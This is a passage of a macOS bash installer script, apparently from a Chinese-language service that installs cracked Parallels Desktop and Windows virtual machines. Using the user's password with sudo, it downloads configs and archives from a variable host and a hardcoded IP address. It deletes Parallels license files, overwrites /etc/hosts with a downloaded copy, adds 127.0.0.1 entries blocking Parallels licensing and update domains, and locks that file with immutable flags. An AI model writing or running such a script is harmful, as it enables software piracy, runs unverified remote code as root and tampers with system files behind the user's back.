	if [ -f ~/Downloads/JG_Download/v7.7z ]; then
    /tmp/7z -y x -p${zxc:7:1}${zxc:8:1}${zxc:10:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}${cxz:11:1} ~/Downloads/JG_Download/v7.7z -o/Applications>/dev/null 2>&1
    #curl -# -C - --connect-timeout 10 -o ~/Downloads/JG_Download/Mbox.exe "$ip5/Mbox.exe">/dev/null 2>&1
    if [ "$vvm19" ]; then
    curl -# -C - --connect-timeout 10 -o "/tmp/Windows 7 x64.vmx" "$ip5/719.vmx">/dev/null 2>&1
    rm -rf /Applications/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64.vmx
    cp "/tmp/Windows 7 x64.vmx" /Applications/Windows\ 7\ x64.vmwarevm
    fi
    if [ "$vvm16" ]; then
    curl -# -C - --connect-timeout 10 -o "/tmp/Windows 7 x64.vmx" "$ip5/716.vmx">/dev/null 2>&1
    rm -rf /Applications/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64.vmx
    cp "/tmp/Windows 7 x64.vmx" /Applications/Windows\ 7\ x64.vmwarevm
    fi   
    if [ "$vvm14" ]; then
    curl -# -C - --connect-timeout 10 -o "/tmp/Windows 7 x64.vmx" "$ip5/714.vmx">/dev/null 2>&1
    rm -rf /Applications/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64.vmx
    cp "/tmp/Windows 7 x64.vmx" /Applications/Windows\ 7\ x64.vmwarevm
    fi 
    if [ "$vvm12" ]; then
    curl -# -C - --connect-timeout 10 -o "/tmp/Windows 7 x64.vmx" "$ip5/712.vmx">/dev/null 2>&1
    rm -rf /Applications/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64.vmx
    cp "/tmp/Windows 7 x64.vmx" /Applications/Windows\ 7\ x64.vmwarevm
    fi 
    fi
    
    if [ -f ~/Downloads/JG_Download/17Win10.7z ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/1710.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 10.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 10.pvm
    rm -rf /tmp/config.pvs
    
    
    if [[ $memtotal = "8" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/4g1710.pvs">/dev/null 2>&1
    if [ -f /tmp/config.pvs ]; then
    rm -rf /Applications/Windows\ 10.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 10.pvm
    rm -rf /tmp/config.pvs
    fi
    fi    
    if [[ $memtotal = "16" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/8g1710.pvs">/dev/null 2>&1
    if [ -f /tmp/config.pvs ]; then
    rm -rf /Applications/Windows\ 10.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 10.pvm
    rm -rf /tmp/config.pvs
    fi
    fi
    if [[ $memtotal = "32" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/8g1710.pvs">/dev/null 2>&1
    if [ -f /tmp/config.pvs ]; then
    rm -rf /Applications/Windows\ 10.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 10.pvm
    rm -rf /tmp/config.pvs
    fi
    fi 
    fi
    
    if [ -f ~/Downloads/JG_Download/Win11.7z ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/iqp11.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    fi
    if [ -f ~/Downloads/JG_Download/Win10.7z ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/iqp10.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 10.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 10.pvm
    rm -rf /tmp/config.pvs
    fi
    if [ -f ~/Downloads/JG_Download/Win7.7z ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/iqp7.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 7.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 7.pvm
    rm -rf /tmp/config.pvs
    fi
    if [ "$M1Yes" ]; then
    if [ ! "$xnnew10" ]; then
    if [ -f ~/Downloads/JG_Download/628ARM10.7z ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/4gqp10.pvs">/dev/null 2>&1
    if [ -f /tmp/config.pvs ]; then
    rm -rf /Applications/Windows\ 10.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 10.pvm
    rm -rf /tmp/config.pvs
    fi
    if [[ $pdbb != "16" ]]; then
    if [[ $memtotal = "16" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/8g.pvs">/dev/null 2>&1
    if [ -f /tmp/config.pvs ]; then
    rm -rf /Applications/Windows\ 10.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 10.pvm
    rm -rf /tmp/config.pvs
    fi
    fi
    if [[ $memtotal = "32" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/16g.pvs">/dev/null 2>&1
    if [ -f /tmp/config.pvs ]; then
    rm -rf /Applications/Windows\ 10.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 10.pvm
    rm -rf /tmp/config.pvs
    fi
    fi
    fi  
    if [[ $pdbb != "18" ]]; then
    if [ "$zxos" ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/1310.pvs">/dev/null 2>&1
    if [ -f /tmp/config.pvs ]; then
    rm -rf /Applications/Windows\ 10.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 10.pvm
    rm -rf /tmp/config.pvs    
    fi
    fi
    fi
    fi 
    if [ -f ~/Downloads/JG_Download/903ARM11.7z ]; then
    if [[ $pdbb != "16" ]]; then
    if [[ $memtotal = "16" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/8g11.pvs">/dev/null 2>&1
    if [ -f /tmp/config.pvs ]; then
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    fi
    fi
    if [[ $memtotal = "32" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/16g11.pvs">/dev/null 2>&1
    if [ -f /tmp/config.pvs ]; then
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    fi
    fi
    fi
    if [[ $pdbb != "18" ]]; then
    if [ "$zxos" ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/1311.pvs">/dev/null 2>&1
    if [ -f /tmp/config.pvs ]; then
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    fi
    fi
    fi
    fi
    
    if [ -f ~/Downloads/JG_Download/A111212.7z ]; then
    if [[ $pdbb != "16" ]]; then
    if [[ $memtotal = "16" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/8ga11.pvs">/dev/null 2>&1
    if [ -f /tmp/config.pvs ]; then
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    fi
    fi
    if [[ $memtotal = "32" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/16ga11.pvs">/dev/null 2>&1
    if [ -f /tmp/config.pvs ]; then
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    fi
    fi
    fi
    if [[ $pdbb != "18" ]]; then
    if [ "$zxos" ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/A1113.pvs">/dev/null 2>&1
    if [ -f /tmp/config.pvs ]; then
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    fi
    fi
    fi
    fi
    
    if [ -f ~/Downloads/JG_Download/628ARM11.7z ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/4gqp11.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    if [[ $pdbb = "17" ]]; then
    if [[ $memtotal = "16" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/8g11.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    fi
    if [[ $memtotal = "32" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/16g11.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    fi
    fi
    if [[ $pdbb = "18" ]]; then
    if [[ $memtotal = "16" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/8g11.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    fi
    if [[ $memtotal = "32" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/16g11.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    fi
    fi
    if [[ $pdbb != "18" ]]; then
    if [ "$zxos" ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/1311.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs    
    fi
    fi
    fi    
    fi
    fi
    if [ "$zxos" ]; then
    if [ ! "$M1Yes" ]; then
    if [[ $pdbb != "18" ]]; then
    if [ -f ~/Downloads/JG_Download/16Win7_911.7z ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/i137.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 7.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 7.pvm
    rm -rf /tmp/config.pvs     
    fi
    if [ -f ~/Downloads/JG_Download/16Win10.7z ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/i1310.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 10.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 10.pvm
    rm -rf /tmp/config.pvs     
    fi
    if [ -f ~/Downloads/JG_Download/16Win11.7z ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/i1311.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs     
    fi
    fi
    fi
    fi
    
    if [ ! "$M1Yes" ]; then
    if [[ $pdbb = "18" ]]; then
    if [ -f ~/Downloads/JG_Download/16Win7_911.7z ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/167.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 7.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 7.pvm
    rm -rf /tmp/config.pvs     
    fi
    fi
    fi
    
    if [ "$xnnew10" ]; then
    echo
    
    if [[ $memtotal = "16" ]]; then
    sjmnc="1"
    fi
    if [[ $memtotal = "24" ]]; then
    sjmnc="1"
    fi
    if [[ $memtotal = "32" ]]; then
    sjmnc="1"
    fi
    if [[ $memtotal = "64" ]]; then
    sjmnc="1"
    fi
    
    if [ "$sjmnc" ]; then
    if [ -f ~/Downloads/JG_Download/1113ARM10.7z ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/8gk10.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 10.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 10.pvm
    rm -rf /tmp/config.pvs
    fi
    if [ -f ~/Downloads/JG_Download/1113ARM11.7z ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/8gk11.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    fi
    if [ -f ~/Downloads/JG_Download/1122H2.7z ]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/8g11h.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    fi
    fi
    
    
    if [ -f ~/Downloads/JG_Download/823ARM10.7z ]; then
    rm -rf /Applications/Windows\ 10.pvm/Snapshots.xml
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/4gn10.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 10.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 10.pvm
    rm -rf /tmp/config.pvs
    if [[ $memtotal = "16" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/8gn10.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 10.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 10.pvm
    rm -rf /tmp/config.pvs
    fi
    if [[ $memtotal = "24" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/8gn10.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 10.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 10.pvm
    rm -rf /tmp/config.pvs
    fi
    if [[ $memtotal = "32" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/16gn10.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 10.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 10.pvm
    rm -rf /tmp/config.pvs
    fi
    fi
    if [ -f ~/Downloads/JG_Download/823ARM11.7z ]; then
    rm -rf /Applications/Windows\ 11.pvm/Snapshots.xml
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/4gn11.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    if [[ $memtotal = "16" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/8gn11.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    fi
    if [[ $memtotal = "24" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/8gn11.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    fi
    if [[ $memtotal = "32" ]]; then
    curl -# -C - --connect-timeout 10 -o /tmp/config.pvs "$ip5/16gn11.pvs">/dev/null 2>&1
    rm -rf /Applications/Windows\ 11.pvm/config.pvs
    cp /tmp/config.pvs /Applications/Windows\ 11.pvm
    rm -rf /tmp/config.pvs
    fi    
    fi
    fi
    
    
    
    if [ "$zazxtt" ]; then
    open /Applications
    clear && printf "\e[3J"
    echo
	echo	
    echo ID: "\033[36m${tbid}\033[0m"		
	echo
	echo
	osascript -e 'Tell application "System Events" to display dialog "安装完成，请通知技术员！" buttons {"OK"}'
    exit 0   
    fi
    if [ -f ~/Downloads/JG_Download/ParallelsDesktop-"$pdbb"*.dmg ]; then
 	if [ -f ~/Downloads/JG_Download/ParallelsDesktop-17*.dmg ]; then
	pdbb="17"
	fi
	if [ -f ~/Downloads/JG_Download/ParallelsDesktop-18*.dmg ]; then
	pdbb="18"
	fi
	if [ "$moderoot" ]; then
osascript <<EOD
do shell script "chflags noschg /Library/Preferences/Parallels/licenses.json" password "$pass" with administrator privileges
do shell script "chflags nouchg /Library/Preferences/Parallels/licenses.json" password "$pass" with administrator privileges
EOD
else
	echo "$pass" | sudo -S sudo chflags noschg /Library/Preferences/Parallels/licenses.json >/dev/null 2>&1
    echo "$pass" | sudo -S sudo chflags nouchg /Library/Preferences/Parallels/licenses.json >/dev/null 2>&1
    fi
    if [ ! -e /Applications/Parallels\ Desktop.app ]; then
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "rm -rf /Library/Preferences/Parallels/licenses.json" password "$pass" with administrator privileges
do shell script "rm -rf /Library/Preferences/Parallels/licenses.xml" password "$pass" with administrator privileges
EOD
else
    echo "$pass" | sudo -S sudo rm -rf /Library/Preferences/Parallels/licenses.json >/dev/null 2>&1
    echo "$pass" | sudo -S sudo rm -rf /Library/Preferences/Parallels/licenses.xml >/dev/null 2>&1
    fi
    else
    PDFM_DIR="/Applications/Parallels Desktop.app"
    PDFM_LOC="/Library/Preferences/Parallels/parallels-desktop.loc"
    if [ -f "${PDFM_LOC}" ]; then
    PDFM_DIR=$(cat "${PDFM_LOC}")
    fi
    VERSION_1=$(defaults read "${PDFM_DIR}/Contents/Info.plist" CFBundleShortVersionString)
    PDVS="${VERSION_1:0:2}"
    if [ "$PDVS" != "$pdbb" ]; then
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "rm -rf /Library/Preferences/Parallels/licenses.json" password "$pass" with administrator privileges
do shell script "rm -rf /Library/Preferences/Parallels/licenses.xml" password "$pass" with administrator privileges
EOD
else
    echo "$pass" | sudo -S sudo rm -rf /Library/Preferences/Parallels/licenses.json >/dev/null 2>&1
    echo "$pass" | sudo -S sudo rm -rf /Library/Preferences/Parallels/licenses.xml >/dev/null 2>&1
    fi
    fi
    fi
    hdiutil attach ~/Downloads/JG_Download/ParallelsDesktop-"$pdbb"*.dmg>/dev/null 2>&1
    if [ "$moderoot" ]; then
osascript <<EOD
do shell script "'/Volumes/Parallels Desktop $pdbb/Parallels Desktop.app/Contents/MacOS/inittool' install -t '/Applications/Parallels Desktop.app' -s" password "$pass" with administrator privileges
EOD
else
if [ "$dkzdqx" ]; then
echo "$pass" | sudo -S sudo /Volumes/Parallels\ Desktop\ "$pdbb"/Parallels\ Desktop.app/Contents/MacOS/inittool install -t "/Applications/Parallels Desktop.app" -s>/dev/null 2>&1
else
echo
curl -# -C - --connect-timeout 10 -o /tmp/azpd.zip "$osip/azpd.zip"
unzip -o "/tmp/azpd.zip" -d "/tmp" >/dev/null 2>&1
clear && printf "\e[3J"
echo
echo
echo
echo "\033[36m请点击【继续】安装程序\033[0m"		
echo
echo
echo
echo "\033[36m安装中的【提示】都点【好】\033[0m"	
echo
echo
echo
echo "\033[36m安装【完后】请点击【关闭】！\033[0m"	
echo
echo
echo
open -W /tmp/"$pdbb".pkg
fi
fi
if [ ! "$zazxtt" ]; then
if [ "$scpdk" ]; then
	if [ "$moderoot" ]; then
osascript <<EOD
do shell script "rm -rf /Library/Preferences/Parallels/vmdirectorylist.desktop.xml" password "$pass" with administrator privileges
EOD
    else
    echo "$pass" | sudo -S sudo rm -rf /Library/Preferences/Parallels/vmdirectorylist.desktop.xml >/dev/null 2>&1	
	fi
fi
fi
    if [ ! -e /Applications/Parallels\ Desktop.app ]; then
    clear && printf "\e[3J"
    echo
	echo	
    echo ID: "\033[36m${tbid}\033[0m"		
	echo
	read -s -n1 -p "未能安装虚拟机软件，空间不足或者修复非root，再重试..."
	if [ "$ycmmaz" ]; then
	clear && printf "\e[3J"
    echo
	echo
	echo
	osascript -e 'Tell application "System Events" to display dialog "未能安装虚拟机软件，空间不足或者修复非root，请通知技术员！" buttons {"OK"}'
	exit
	fi
	ZLDQ
    fi
    if [[ $pdbb != "18" ]]; then
    if [[ $pdbb != "17" ]]; then
    if [ ! "$pd16jh" ]; then
curl -# -C - --connect-timeout 10 -o /tmp/hosts.zip "$ip5/hosts.zip">/dev/null 2>&1
unzip -o "/tmp/hosts.zip" -d "/tmp">/dev/null 2>&1
if [ "$moderoot" ]; then
osascript <<EOD
do shell script "chflags nouchg /etc/hosts" password "$pass" with administrator privileges
do shell script "chflags -hv noschg /etc/hosts" password "$pass" with administrator privileges
do shell script "rm -rf /etc/hosts" password "$pass" with administrator privileges
do shell script "cp /tmp/hosts /etc" password "$pass" with administrator privileges
EOD
else
echo "$pass" | sudo -S sudo chflags nouchg /etc/hosts >/dev/null 2>&1
echo "$pass" | sudo -S sudo chflags -hv noschg /etc/hosts >/dev/null 2>&1
echo "$pass" | sudo -S sudo rm -rf /etc/hosts >/dev/null 2>&1
echo "$pass" | sudo -S sudo cp /tmp/hosts /etc >/dev/null 2>&1
fi
	curl -# -C - --connect-timeout 10 -o /tmp/PDTun.zip "$ip5/PDTun.zip">/dev/null 2>&1
	unzip -o "/tmp/PDTun.zip" -d "/Applications">/dev/null 2>&1
	if [ ! -e /Applications/启动Win系统.app ]; then
	curl -# -C - --connect-timeout 10 -o /tmp/PDTun.zip "http://101.91.152.128:2233/mac/PDTun.zip">/dev/null 2>&1
	unzip -o "/tmp/PDTun.zip" -d "/Applications">/dev/null 2>&1
	fi
	else
	zhenhosts=$(cat /etc/hosts | grep www.parallels.com)
   	if [ ! "$zhenhosts" ]; then
   	if [ "$moderoot" ]; then
osascript <<EOD
if (do shell script "cat /etc/hosts") does not contain "download.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 download.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "desktop.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 desktop.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "download.parallels.com.cdn.cloudflare.net" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 download.parallels.com.cdn.cloudflare.net\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "update.parallels.com.cdn.cloudflare.net" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 update.parallels.com.cdn.cloudflare.net\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "desktop.parallels.com.cdn.cloudflare.net" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 desktop.parallels.com.cdn.cloudflare.net\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.cn" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.cn\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.de" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.de\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.es" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.es\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.fr" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.fr\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.nl" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.nl\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.pt" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.pt\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallels.ru" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallels.ru\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "www.parallelskorea.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 www.parallelskorea.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "reportus.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 reportus.parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.cn" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.cn\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.de" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.de\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.es" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.es\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.fr" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.fr\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.nl" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.nl\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.pt" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.pt\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallels.ru" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallels.ru\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "parallelskorea.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 parallelskorea.com\" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "pax-manager.myparallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 pax-manager.myparallels.com" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "myparallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 myparallels.com" >> /etc/hosts" password "$pass" with administrator privileges
end if
if (do shell script "cat /etc/hosts") does not contain "my.parallels.com" then
	do shell script "/usr/bin/printf \"\\n127.0.0.1 my.parallels.com" >> /etc/hosts" password "$pass" with administrator privileges
end if
do shell script "chflags uchg /etc/hosts" password "$pass" with administrator privileges
do shell script "chflags schg /etc/hosts" password "$pass" with administrator privileges
EOD
    else
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 download.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 desktop.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 download.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 update.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 desktop.parallels.com.cdn.cloudflare.net" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.cn" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.de" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.es" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.fr" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.nl" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.pt" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallels.ru" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 www.parallelskorea.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 reportus.parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.com" >> /etc/hosts'
   	echo "$pass" | sudo -S sudo sh -c 'printf "\\n127.0.0.1 parallels.cn" >> /etc/hosts'
